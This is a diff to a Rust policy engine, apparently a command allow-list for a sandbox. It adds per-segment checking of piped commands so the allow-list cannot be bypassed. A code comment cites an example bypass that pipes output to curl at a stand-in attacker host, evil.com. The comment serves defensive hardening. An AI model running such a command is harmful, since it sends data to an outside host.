@@ -354,7 +354,34 @@ impl PolicyEngine {
             }
         }
 
-        // Check allowed commands
+        // Check for piped commands — validate each pipeline segment independently
+        // This prevents bypassing allow-lists via e.g. `echo foo | curl http://evil.com`
+        let segments: Vec<&str> = command.split('|').collect();
+        if segments.len() > 1 {
+            for segment in &segments {
+                let trimmed = segment.trim();
+                if trimmed.is_empty() {
+                    continue;
+                }
+                let seg_first = trimmed.split_whitespace().next().unwrap_or("");
+                let seg_allowed = policy.allowed_commands.iter().any(|a| {
+                    if a == "*" {
+                        return true;
+                    }
+                    seg_first == a || trimmed.starts_with(a)
+                });
+                if !seg_allowed {
+                    return Decision::Deny(format!(
+                        "Pipeline segment '{}' is not in the allowed list",
+                        seg_first
+                    ));
+                }
+            }
+            // All segments passed — allow the piped command
+            return Decision::Allow;
+        }
+
+        // Check allowed commands (single command, no pipe)
         let first_word = command.split_whitespace().next().unwrap_or("");
         let is_allowed = policy.allowed_commands.iter().any(|a| {
             if a == "*" {
